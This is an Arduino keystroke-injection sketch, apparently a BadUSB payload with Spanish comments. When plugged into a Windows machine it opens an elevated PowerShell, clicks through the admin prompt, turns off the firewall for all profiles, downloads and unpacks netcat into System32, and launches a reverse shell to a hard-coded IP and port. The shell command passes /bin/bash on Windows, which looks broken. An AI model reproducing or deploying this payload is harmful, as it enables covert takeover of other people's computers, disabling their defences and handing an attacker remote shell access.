#include <HID-Project.h>
#include <HID-Settings.h>

void enter(){
  Keyboard.press(KEY_ENTER);
  delay(50);
  Keyboard.release(KEY_ENTER);
}

void setup()
{
  Keyboard.begin();
  
  delay(3000);
  //-----------Win + R----------
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114); //r
  Keyboard.releaseAll();
  //-----------Powershell administrador-------------
  delay(1500);
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  //Keyboard.print("notepad");
  delay(2000);
  enter();
  delay(2000);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(2000);
  
  enter();
  
  delay(2000);
  //----------Desactivar Firewall------------------
  Keyboard.print("netsh advfirewall set allprofiles state off");
  delay(2000);
  enter();
  delay(2000);
  //----------Crear carpeta netcat--------
  Keyboard.print("mkdir netcat");
  delay(2000);
  enter();
  delay(2000);
  Keyboard.print("cd netcat");
  delay(2000);
  enter();
  delay(2000);
  //---------Instalar netcat--------
  Keyboard.print("invoke-webrequest -uri \"https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip\" -outfile \"Netcat.zip\"");
  delay(2000);
  enter();
  delay(4000);
  Keyboard.print("Expand-Archive -LiteralPath 'C:\\Windows\\System32\\netcat\\Netcat.zip' -DestinationPath 'C:\\Windows\\System32\\netcat\\descomprimido'");
  delay(2000);
  enter();
  delay(2000);
  //--------Carpeta Descomprimida-------
  Keyboard.print("cd .\\descomprimido\\netcat-1.11");
  delay(2000);
  enter();
  delay(4000);
  //--------Iniciar Reverse Shell-------- 
  Keyboard.print(".\\nc64.exe -e /bin/bash 10.7.3.197 87");
   enter();
  Keyboard.end();
}

void loop() {}
